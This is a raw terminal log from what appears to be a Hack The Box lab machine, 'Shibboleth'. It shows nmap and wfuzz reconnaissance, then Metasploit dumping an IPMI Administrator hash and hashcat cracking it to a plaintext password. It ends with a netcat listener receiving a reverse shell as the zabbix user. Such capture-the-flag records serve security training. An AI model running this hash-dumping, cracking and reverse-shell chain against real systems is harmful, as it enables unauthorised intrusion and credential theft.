# Nmap 7.92 scan initiated Sun Dec  5 09:50:46 2021 as: nmap -sC -sV -A -T4 -oN nmap.txt 10.129.228.134
Nmap scan report for 10.129.228.134
Host is up (0.16s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/5%OT=80%CT=1%CU=34455%PV=Y%DS=2%DC=T%G=Y%TM=61AC3E3
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=Y%DF=Y%T=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Network Distance: 2 hops
Service Info: Host: shibboleth.htb

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   176.45 ms 10.10.14.1
2   176.56 ms 10.129.228.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec  5 09:51:12 2021 -- 1 IP address (1 host up) scanned in 26.09 seconds


nmap -sC -sV -A -sU -T4 10.129.228.134 -oN nmap.txt                                                                                               
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-05 10:21 IST
Warning: 10.129.228.134 giving up on port because retransmission cap hit (6).
Stats: 0:12:30 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 80.20% done; ETC: 10:37 (0:03:05 remaining)
Stats: 0:16:02 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 99.99% done; ETC: 10:37 (0:00:00 remaining)
Nmap scan report for shibboleth.htb (10.129.228.134)
Host is up (0.18s latency).
Not shown: 986 closed udp ports (port-unreach)
PORT      STATE         SERVICE         VERSION
623/udp   open          asf-rmcp
1100/udp  open|filtered mctp
20120/udp open|filtered unknown
32776/udp open|filtered sometimes-rpc16
34758/udp open|filtered unknown
38615/udp open|filtered unknown
42639/udp open|filtered unknown
43195/udp open|filtered unknown
44923/udp open|filtered unknown
49180/udp open|filtered unknown
51690/udp open|filtered unknown
54114/udp open|filtered unknown
54807/udp open|filtered unknown
58640/udp open|filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port623-UDP:V=7.92%I=7%D=12/5%Time=61AC4942%P=x86_64-pc-linux-gnu%r(ipm
SF:i-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x01
SF:\x97\x04\x03\0\0\0\0\t");
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   195.35 ms 10.10.14.1
2   195.49 ms shibboleth.htb (10.129.228.134)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1090.04 seconds

![image](https://user-images.githubusercontent.com/63084488/144736550-0fc4eec2-6925-47d9-b6b4-1416466f4823.png)



wfuzz -H "Host: FUZZ.shibboleth.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 290 --hc 302 http://shibboleth.htb/
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shibboleth.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
=====================================================================

000000099:   200        29 L     219 W      3684 Ch     "monitor"                                                                                                                  
000000346:   200        29 L     219 W      3684 Ch     "monitoring"                                                                                                               
000000390:   200        29 L     219 W      3684 Ch     "zabbix"                                                                                                                   

Total time: 88.22547
Processed Requests: 4989
Filtered Requests: 4986
Requests/sec.: 56.54829


msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show actions

Auxiliary actions:

   Name  Description
   ----  -----------


msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   CRACK_COMMON          true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                      no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                         no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                                                                                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 623                                                                yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                                  yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                                  yes       Delay between session retries in seconds
   THREADS               1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set RHOSTS shibboleth.htb
RHOSTS => shibboleth.htb
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set threads 10
threads => 10
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > options

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                  Current Setting                                                    Required  Description
   ----                  ---------------                                                    --------  -----------
   CRACK_COMMON          true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                      no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                         no        Save captured password hashes in john the ripper format
   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS                shibboleth.htb                                                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT                 623                                                                yes       The target port
   SESSION_MAX_ATTEMPTS  5                                                                  yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
   SESSION_RETRY_DELAY   5                                                                  yes       Delay between session retries in seconds
   THREADS               10                                                                 yes       The number of concurrent threads (max one per host)
   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line

msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.228.134:623 - IPMI - Hash found: Administrator:5fc848fa820100002eeb192a99e29bd979c53735eadc040ebd88ff2ec56657f8fb461961e0bd8a1ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:828b49d276eb4edfc57cbebdd63a8e89c9765a41
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) 





hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
* Device #2: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed(): Not Supported

CUDA API (CUDA 11.4)
====================
* Device #1: NVIDIA GeForce GTX 1650, 3856/3911 MB, 14MCU

OpenCL API (OpenCL 3.0 CUDA 11.4.158) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #2: NVIDIA GeForce GTX 1650, skipped

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================
* Device #3: pthread-AMD Ryzen 7 4800H with Radeon Graphics, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 309 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 0 secs

5fc848fa820100002eeb192a99e29bd979c53735eadc040ebd88ff2ec56657f8fb461961e0bd8a1ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:828b49d276eb4edfc57cbebdd63a8e89c9765a41:ilovepumkinpie1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: IPMI2 RAKP HMAC-SHA1
Hash.Target......: 5fc848fa820100002eeb192a99e29bd979c53735eadc040ebd8...765a41
Time.Started.....: Sun Dec  5 10:58:52 2021 (1 sec)
Time.Estimated...: Sun Dec  5 10:58:53 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  5500.2 kH/s (8.98ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8257536/14344385 (57.57%)
Rejected.........: 0/8257536 (0.00%)
Restore.Point....: 7340032/14344385 (51.17%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: ina-123456 -> estampillas
Hardware.Mon.#1..: Temp: 53c Util: 36% Core:1785MHz Mem:5000MHz Bus:8

Started: Sun Dec  5 10:58:33 2021
Stopped: Sun Dec  5 10:58:54 2021



nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.10] from (UNKNOWN) [10.129.228.134] 50404
bash: cannot set terminal process group (1201): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@shibboleth:/$ ls
